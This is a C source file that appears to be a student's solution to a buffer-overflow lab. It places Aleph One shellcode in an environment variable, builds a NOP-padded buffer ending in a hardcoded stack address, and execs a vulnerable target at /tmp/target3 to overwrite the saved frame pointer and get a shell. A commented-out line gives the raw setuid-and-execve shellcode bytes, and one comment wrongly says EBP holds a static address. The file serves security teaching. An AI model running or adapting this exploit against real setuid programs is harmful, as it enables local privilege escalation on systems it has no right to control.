#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

static char env_addr[] = "\xb9\xff\xff\xbf";

int main(void)
{
  char *args[3]; 
  char *env[2];
  
  // Set environment pointer
  int success = setenv("ALEPHCODE", shellcodeAlephOne, 1);
  char* env_ptr = getenv("ALEPHCODE");

  // EBP is the base pointer, which points to the bottom of the stack and is used to reference local variables by providing an offset 
  // to the register (note; EBP register has a static address, it is the only register that holds the same addresses through out the process execution).
  char buffer[20]; // We cannot overwrite EIP with 20 bytes, but we can overwrite EBP
  // Prob will need environment variable approach again
  // Do we need to set env or can we just pass in "/bin/sh" to env[1]?
  memset(buffer, 0x90, 16);
  memcpy(buffer + 16, env_addr, 4); // Address of aleph shell code?

  args[0] = TARGET;
  // args[1] = "AAAAAAAAAAAAAAAAAAAA";
  args[1] = buffer;
  args[2] = NULL;
  
  // env[0] = "/bin/sh"; // Not /bin/sh for this attack, need to pass in alephone shell code
  // env[0] = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
  env[0] = env_ptr;
  env[1] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


